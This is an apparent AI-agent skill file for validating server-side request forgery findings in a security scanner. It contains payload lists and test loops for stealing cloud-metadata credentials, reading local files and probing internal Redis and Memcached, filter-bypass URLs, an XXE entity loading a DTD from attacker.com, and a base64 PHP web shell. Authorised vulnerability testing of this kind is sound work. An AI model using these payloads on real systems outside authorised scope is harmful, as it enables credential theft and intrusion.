---
name: ssrf-testing
description: Validate Server-Side Request Forgery (SSRF) vulnerabilities by testing if user-controlled URLs can reach internal services, cloud metadata endpoints, or alternative protocols. Use when testing CWE-918 (SSRF), CWE-441 (Unintended Proxy), CWE-611 (XXE leading to SSRF), or findings involving URL fetching, webhooks, file imports, image/PDF/SVG processing, or XML parsing with external entities.
allowed-tools: Read, Write, Bash
---

# SSRF Testing Skill

## Purpose
Validate SSRF vulnerabilities by sending crafted URLs to user-controlled input points and observing:
- **Internal service access** (localhost, internal IPs, cloud metadata)
- **Protocol smuggling** (file://, gopher://, dict://)
- **Filter bypass success** (IP encoding, DNS rebinding, redirects)
- **Out-of-band callbacks** (OOB detection for blind SSRF)

## Vulnerability Types Covered

### 1. Basic SSRF (CWE-918)
Force server to make requests to attacker-controlled or internal destinations.

**Test Pattern:** Supply internal URL in user-controlled parameter  
**Expected if secure:** Request blocked or validated  
**Actual if vulnerable:** Server fetches internal resource and returns/processes content

### 2. Blind SSRF (CWE-918)
Server makes request but response is not returned to attacker.

**Test Pattern:** Supply OOB callback URL (Burp Collaborator, interact.sh)  
**Expected if secure:** No callback received  
**Actual if vulnerable:** HTTP/DNS callback received at attacker server

### 3. Cloud Metadata SSRF (CWE-918)
Access cloud provider metadata endpoints to steal credentials.

**Test Pattern:** Request `http://169.254.169.254/latest/meta-data/` (AWS) or equivalent  
**Expected if secure:** Request blocked  
**Actual if vulnerable:** IAM credentials, instance metadata exposed

**Cloud Providers:**
- AWS (169.254.169.254) - IMDSv1 & IMDSv2
- GCP (metadata.google.internal) - requires `Metadata-Flavor: Google` header
- Azure (169.254.169.254) - requires `Metadata: true` header
- DigitalOcean, Alibaba (100.100.100.200), Oracle (192.0.0.192), Hetzner

### 4. Protocol Smuggling (CWE-918)
Use alternative URL schemes to access local files or internal services.

**Protocols:**
- `file://` - Local file read
- `gopher://` - Raw TCP (Redis, Memcached, SMTP exploitation)
- `dict://` - Dictionary protocol (service detection)
- `ftp://`, `sftp://`, `tftp://` - File transfer protocols
- `ldap://` - Directory access
- `php://` - PHP stream wrappers (php://filter, php://input)
- `data://` - Data URI scheme
- `jar://` - Java archive scheme
- `netdoc://` - Java netdoc wrapper

### 5. Internal Port Scanning (CWE-918)
Enumerate internal services via response timing or error differences.

**Test Pattern:** Request internal IPs on various ports  
**Expected if secure:** All requests blocked equally  
**Actual if vulnerable:** Different responses for open vs closed ports

### 6. SSRF via XXE (CWE-611 → CWE-918)
XML External Entity injection leading to SSRF.

**Test Pattern:** Inject XXE payload with external entity pointing to internal URL
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```
**Expected if secure:** XXE disabled or external entities blocked  
**Actual if vulnerable:** Internal content returned in XML response

### 7. SSRF via PDF/HTML Rendering (CWE-918)
HTML-to-PDF converters (wkhtmltopdf, Puppeteer, Chrome headless) fetch embedded resources.

**Test Pattern:** Inject HTML with internal resource references
```html
<iframe src="http://169.254.169.254/latest/meta-data/">
<img src="http://127.0.0.1:6379/">
<link rel="stylesheet" href="http://internal-service/">
<script src="http://169.254.169.254/"></script>
```
**CSS-based:**
```css
@import url('http://169.254.169.254/');
background: url('http://127.0.0.1/');
```

### 8. SSRF via SVG/Image Processing (CWE-918)
Image processors that handle SVG or fetch external images.

**Test Pattern:** Upload SVG with external references
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://169.254.169.254/latest/meta-data/" />
  <use href="http://internal/file#id" />
</svg>
```

### 9. Partial URL SSRF (Path Injection)
Application constructs URL from user input (path/host injection).

**Test Pattern:** Inject path traversal or host override
```
# Path injection
/api/proxy?path=../../../internal/admin

# Host injection via @ or CRLF
/api/fetch?url=http://allowed.com@127.0.0.1/
/api/fetch?url=http://allowed.com%0d%0aHost:%20127.0.0.1
```

## Prerequisites
- Target application running and reachable
- Identified SSRF injection points (URL parameters, webhooks, file imports)
- OOB callback server for blind SSRF (optional but recommended)
- VULNERABILITIES.json with suspected SSRF findings

## Testing Methodology

### Phase 1: Identify Injection Points

Before testing, analyze vulnerability report and source code for:
- **URL parameters:** `?url=`, `?path=`, `?src=`, `?dest=`, `?redirect=`, `?uri=`
- **Webhook configurations:** Callback URL fields
- **File import features:** "Import from URL" functionality
- **Image/avatar fetchers:** Profile picture from URL
- **PDF generators:** HTML-to-PDF with embedded resources
- **API integrations:** OAuth callbacks, external API endpoints

**Key insight:** Any user-controlled input that causes server-side HTTP requests is a potential SSRF vector.

### Phase 2: Establish Baseline

Send a request to an external domain you control or an OOB service:

```python
# Baseline: external URL (should work if URL fetching enabled)
baseline_url = "http://example.com/test"
response = requests.post(f"{target}/api/fetch", json={"url": baseline_url})
baseline_status = response.status_code
```

### Phase 3: Test Internal Access

#### Localhost Access
```python
payloads = [
    "http://127.0.0.1",
    "http://localhost",
    "http://127.0.0.1:80",
    "http://127.0.0.1:22",      # SSH
    "http://127.0.0.1:3306",    # MySQL
    "http://127.0.0.1:6379",    # Redis
    "http://[::1]",             # IPv6 localhost
    "http://0.0.0.0",
]

for payload in payloads:
    response = requests.post(f"{target}/api/fetch", json={"url": payload})
    if indicates_internal_access(response):
        classification = "VALIDATED"
        evidence = f"Localhost access via {payload}"
```

#### Cloud Metadata Access
```python
cloud_payloads = {
    "aws": "http://169.254.169.254/latest/meta-data/",
    "aws_iam": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "gcp": "http://metadata.google.internal/computeMetadata/v1/",
    "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "digitalocean": "http://169.254.169.254/metadata/v1/",
    "alibaba": "http://100.100.100.200/latest/meta-data/",
    "oracle": "http://192.0.0.192/latest/meta-data/",
}

for provider, payload in cloud_payloads.items():
    response = requests.post(f"{target}/api/fetch", json={"url": payload})
    if contains_metadata(response):
        classification = "VALIDATED"
        evidence = f"Cloud metadata ({provider}) exposed: {payload}"
```

### Phase 4: Test Filter Bypasses

#### IP Encoding Bypasses
```python
# All resolve to 127.0.0.1
localhost_bypasses = [
    "http://2130706433",           # Decimal
    "http://0x7f000001",           # Hex
    "http://0177.0.0.1",           # Octal
    "http://127.1",                # Short form
    "http://127.0.1",              # Short form
    "http://0",                    # Zero
    "http://[::ffff:127.0.0.1]",   # IPv6 mapped
    "http://[0:0:0:0:0:ffff:127.0.0.1]",
    "http://127.0.0.1.nip.io",     # DNS rebinding
    "http://localtest.me",         # Resolves to 127.0.0.1
]

# All resolve to 169.254.169.254 (AWS metadata)
metadata_bypasses = [
    "http://2852039166",           # Decimal
    "http://0xA9FEA9FE",           # Hex
    "http://0251.0376.0251.0376",  # Octal
    "http://[::ffff:169.254.169.254]",
    "http://169.254.169.254.nip.io",
]
```

#### URL Parser Confusion
```python
parser_bypasses = [
    "http://attacker.com@127.0.0.1/",
    "http://127.0.0.1#@attacker.com/",
    "http://127.0.0.1\\@attacker.com/",
    "http://attacker.com:80#@127.0.0.1/",
    "http://127.1.1.1:80\\@127.2.2.2:80/",
]
```

#### DNS Rebinding
```python
# Use 1u.ms service for DNS rebinding
rebind_payloads = [
    "http://make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms",
    "http://make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms",
]
```

#### Redirect-Based Bypass
```python
# Use redirect service to bypass validation
redirect_payloads = [
    "https://307.r3dir.me/--to/?url=http://127.0.0.1",
    "https://307.r3dir.me/--to/?url=http://169.254.169.254/latest/meta-data/",
]
```

#### Unicode/Punycode Bypass
```python
# Unicode characters that normalize to ASCII
unicode_bypasses = [
    "http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ",           # Enclosed alphanumerics
    "http://①②⑦.⓪.⓪.①",           # Circled numbers
    "http://locⓐlhost",             # Mixed
]
```

#### CRLF Injection in URL
```python
# Inject headers via CRLF in URL
crlf_payloads = [
    "http://allowed.com%0d%0aHost:%20127.0.0.1",
    "http://allowed.com%0d%0a%0d%0aGET%20/internal",
]
```

#### JAR Scheme Bypass (Java)
```python
# Java JAR scheme - fully blind
jar_payloads = [
    "jar:http://127.0.0.1!/",
    "jar:https://127.0.0.1!/",
    "jar:ftp://127.0.0.1!/",
]
```

### Phase 5: Test Protocol Handlers

```python
protocol_payloads = [
    # File access
    "file:///etc/passwd",
    "file:///etc/shadow",
    "file:///proc/self/environ",
    "file:///c:/windows/win.ini",
    "file://\\/\\/etc/passwd",
    
    # Gopher (internal service exploitation)
    "gopher://127.0.0.1:6379/_INFO%0D%0A",                    # Redis INFO
    "gopher://127.0.0.1:11211/_stats%0D%0A",                  # Memcached stats
    "gopher://127.0.0.1:25/_HELO%20localhost%0D%0A",          # SMTP
    "gopher://127.0.0.1:3306/_",                              # MySQL
    
    # Dict (port/service scanning)
    "dict://127.0.0.1:6379/INFO",
    "dict://127.0.0.1:11211/stats",
    
    # PHP wrappers (if PHP backend)
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
    "phar:///path/to/file.phar",
    
    # Java schemes
    "netdoc:///etc/passwd",
    "jar:http://127.0.0.1!/",
    
    # SFTP/FTP
    "sftp://attacker.com:22/",
    "ftp://attacker.com/",
    "tftp://attacker.com:69/file",
    
    # LDAP
    "ldap://127.0.0.1:389/",
    "ldap://127.0.0.1:389/dc=example,dc=com",
]

for payload in protocol_payloads:
    response = requests.post(f"{target}/api/fetch", json={"url": payload})
    if response.status_code == 200 and has_file_content(response):
        classification = "VALIDATED"
        evidence = f"Protocol smuggling via {payload.split(':')[0]}://"
```

### Phase 5b: Test XXE-based SSRF

If application processes XML, test XXE leading to SSRF:

```python
xxe_payloads = [
    # Basic XXE to internal URL
    '''<?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
    <data>&xxe;</data>''',
    
    # Blind XXE with OOB
    '''<?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
    <data>test</data>''',
    
    # XXE to file://
    '''<?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <data>&xxe;</data>''',
]
```

### Phase 5c: Test HTML/PDF Injection SSRF

If application generates PDFs from HTML (wkhtmltopdf, Puppeteer):

```python
html_ssrf_payloads = [
    '<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="600">',
    '<img src="http://127.0.0.1:6379/">',
    '<link rel="stylesheet" href="http://169.254.169.254/">',
    '<script src="http://127.0.0.1/"></script>',
    '<object data="http://169.254.169.254/">',
    '<embed src="http://127.0.0.1/">',
    '<style>@import url("http://169.254.169.254/");</style>',
    '<div style="background: url(\'http://169.254.169.254/\');">',
]
```

### Phase 6: Blind SSRF Detection

```python
# Use OOB callback service
oob_domain = "YOUR_ID.oastify.com"  # Burp Collaborator
# or "YOUR_ID.interact.sh"

blind_payloads = [
    f"http://{oob_domain}/ssrf-test",
    f"http://127.0.0.1.{oob_domain}/",
]

for payload in blind_payloads:
    requests.post(f"{target}/api/fetch", json={"url": payload})

# Check OOB service for callbacks
# If HTTP/DNS callback received → VALIDATED (Blind SSRF)
```

### Phase 7: Classification Logic

```python
def classify_ssrf(response, payload_type, baseline):
    # Check for internal content indicators
    internal_indicators = [
        # Linux files
        "root:x:0:0",               # /etc/passwd
        "daemon:x:1:1",             # /etc/passwd
        "/bin/bash",                # /etc/passwd
        
        # Windows files
        "[boot loader]",            # win.ini
        "[extensions]",             # win.ini
        
        # AWS metadata
        "ami-id",
        "instance-id", 
        "AccessKeyId",
        "SecretAccessKey",
        "iam/security-credentials",
        "meta-data",
        
        # GCP metadata
        "computeMetadata",
        "service-accounts",
        "project-id",
        
        # Azure metadata
        "subscriptionId",
        "resourceGroupName",
        "vmId",
        
        # Services
        "redis_version",            # Redis
        "STAT items",               # Memcached
        "mongodb",                  # MongoDB
        "Server: nginx",            # Internal nginx
        "Server: Apache",           # Internal Apache
        
        # Docker/K8s
        "container_id",
        "kubernetes",
        "docker",
        
        # Process/environment
        "PATH=",                    # /proc/self/environ
        "HOME=",                    # /proc/self/environ
        "AWS_",                     # AWS env vars
    ]
    
    if response.status_code == 200:
        content = response.text.lower()
        
        # Check for internal content
        if any(ind.lower() in content for ind in internal_indicators):
            return "VALIDATED", "Internal/cloud content exposed"
        
        # Check for different response than baseline (potential internal access)
        if response.text != baseline.text and len(response.text) > 0:
            return "PARTIAL", "Different response for internal URL (manual review needed)"
    
    # Check for timing differences (port scanning)
    if payload_type == "port_scan":
        if response_time > baseline_time + 2.0:
            return "PARTIAL", f"Timing anomaly ({response_time:.2f}s) suggests port filtering"
    
    # OOB callback received (checked separately)
    if oob_callback_received:
        return "VALIDATED", "Blind SSRF confirmed via OOB callback"
    
    # Blocked or error
    if response.status_code in [400, 403, 500]:
        return "FALSE_POSITIVE", "Request blocked or rejected"
    
    return "UNVALIDATED", "Inconclusive result"
```

**Status Definitions:**

| Status | Meaning | Criteria |
|--------|---------|----------|
| **VALIDATED** | SSRF confirmed | Internal content returned, cloud metadata exposed, or OOB callback received |
| **FALSE_POSITIVE** | Not vulnerable | All internal requests blocked, no bypass succeeded |
| **PARTIAL** | Possible SSRF | Response differs for internal URLs but no clear content leak; requires manual review |
| **UNVALIDATED** | Test inconclusive | Error, timeout, or ambiguous response |

## Evidence Capture

```json
{
  "status": "VALIDATED",
  "ssrf_type": "cloud_metadata",
  "baseline": {
    "url": "http://example.com/test",
    "status": 200,
    "response_snippet": "<!DOCTYPE html>..."
  },
  "test": {
    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "status": 200,
    "response_snippet": "{\"Code\": \"Success\", \"AccessKeyId\": \"[REDACTED]\", \"SecretAccessKey\": \"[REDACTED]\"}",
    "response_hash": "sha256:abc123...",
    "truncated": false
  },
  "bypass_used": "none",
  "evidence": "AWS IAM credentials exposed via SSRF to metadata endpoint"
}
```

**CRITICAL Redaction Requirements:**
- AWS AccessKeyId, SecretAccessKey, Token
- GCP/Azure access tokens
- Any credentials or secrets in metadata responses
- Internal IP addresses (if sensitive)
- Private SSH keys

## Output Guidelines

**CRITICAL: Keep responses concise (1-4 sentences)**

**Format for VALIDATED:**
```
SSRF on [endpoint] - server fetched [internal_resource] returning [data_type]. [Impact]. Evidence: [file_path]
```

**Format for FALSE_POSITIVE:**
```
SSRF check on [endpoint] - internal requests properly blocked ([status_code]/[error]). Evidence: [file_path]
```

**Format for PARTIAL:**
```
Possible SSRF on [endpoint] - response differs for internal URL but no content leak confirmed. Requires manual review. Evidence: [file_path]
```

**Format for UNVALIDATED:**
```
SSRF test incomplete on [endpoint] - [reason]. Evidence: [file_path]
```

**Examples:**

**Cloud Metadata SSRF:**
```
SSRF on /api/fetch - server accessed AWS metadata (169.254.169.254) exposing IAM credentials. Full AWS account compromise possible. Evidence: .securevibes/ssrf_evidence_001.json
```

**Localhost Access:**
```
SSRF on /webhook/test - server fetched http://127.0.0.1:6379 (Redis) returning version info. Internal service enumeration confirmed. Evidence: .securevibes/ssrf_evidence_002.json
```

**Protocol Smuggling:**
```
SSRF on /api/import - file:// protocol accepted, returned /etc/passwd contents. Local file read vulnerability. Evidence: .securevibes/ssrf_evidence_003.json
```

**Blind SSRF:**
```
Blind SSRF on /pdf/generate - OOB callback received at interact.sh from target server. Server makes external requests. Evidence: .securevibes/ssrf_evidence_004.json
```

**What NOT to do:**
- ❌ Don't repeat full payload lists in output
- ❌ Don't include raw credential values (always redact)
- ❌ Don't write multi-paragraph analysis
- ❌ Don't provide remediation unless requested

## CWE Mapping

This skill validates:
- **CWE-918:** Server-Side Request Forgery (SSRF)
- **CWE-441:** Unintended Proxy or Intermediary
- **CWE-611:** Improper Restriction of XML External Entity Reference (XXE → SSRF)
- **CWE-829:** Inclusion of Functionality from Untrusted Control Sphere (via PDF/HTML rendering)

## Safety Rules

**Skill Responsibilities:**
- ONLY test against --target-url provided by user
- NEVER exfiltrate actual cloud credentials (capture evidence of exposure, redact values)
- STOP if destructive action detected (e.g., gopher:// to Redis FLUSHALL)
- Redact all sensitive data in evidence files
- Use benign payloads (INFO, GET) not destructive ones (DELETE, FLUSHALL)

**Scanner Responsibilities (handled at infrastructure level):**
- Production URL detection
- User confirmation prompts
- Target reachability checks

## Error Handling
- Target unreachable → Mark UNVALIDATED
- Timeout on internal request → Note in evidence, may indicate filtering
- Connection refused → May indicate port scanning capability (PARTIAL)
- OOB service unavailable → Test non-blind methods only, note limitation

## Examples

For comprehensive examples with payloads and evidence, see `examples.md`:
- **Basic SSRF**: Localhost and internal IP access
- **Cloud Metadata**: AWS, GCP, Azure, DigitalOcean, Alibaba, Oracle
- **Filter Bypasses**: IP encoding, DNS rebinding, redirects, URL parser confusion
- **Protocol Smuggling**: file://, gopher://, dict://, ldap://
- **Blind SSRF**: OOB detection techniques

## Reference Implementations

See `reference/` directory for implementation examples:
- **`ssrf_payloads.py`**: Payload generators for all bypass techniques
- **`validate_ssrf.py`**: Complete SSRF testing script with classification
- **`README.md`**: Usage guidance and adaptation notes

### Additional Resources

- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [OWASP SSRF Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [HackTricks SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)

